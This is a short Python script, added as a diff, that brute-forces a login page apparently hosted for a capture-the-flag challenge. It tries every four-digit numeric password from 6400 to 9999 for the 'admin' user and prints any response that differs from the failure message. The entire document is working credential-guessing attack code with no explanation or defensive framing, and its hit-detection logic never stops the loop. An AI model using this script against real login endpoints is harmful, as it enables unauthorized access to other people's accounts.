@@ -1,0 +1,12 @@
+import time 
+import requests 
+
+url = "http://8bca00c6-17ee-4861-b8d0-a55be3b62b80.node5.buuoj.cn:81/?username=admin&password="
+for i in range(6400,10000):
+    res = requests.get(url + str(i))
+    print("[*] Trying :", str(i))
+    time.sleep(0)
+    if res.text != "Bish bnaa":
+        print("***yuwe***")
+        print(res.text)
+        continue
